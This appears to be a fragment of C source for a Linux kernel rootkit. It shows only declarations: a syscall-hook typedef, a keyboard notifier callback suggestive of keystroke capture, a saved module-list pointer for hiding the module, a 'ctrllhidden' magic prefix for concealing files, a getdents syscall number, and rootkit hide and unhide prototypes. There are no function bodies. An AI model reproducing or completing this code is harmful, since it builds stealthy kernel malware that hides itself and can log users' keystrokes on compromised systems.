typedef asmlinkage long (*t_syscall)(const struct pt_regs *);

int kb_cb(struct notifier_block *nblock, unsigned long code, void *_param);

static struct notifier_block kb_blk = {
	.notifier_call = kb_cb,
};

static struct list_head *module_previous;

#define MAGIC_PREFIX "ctrllhidden"

#ifndef __NR_getdents
#define __NR_getdents 141
#endif

#ifndef IS_ENABLED
#define IS_ENABLED(option) \
(defined(__enabled_ ## option) || defined(__enabled_ ## option ## _MODULE))
#endif

void rootkit_hide(void);
void rootkit_unhide(void);
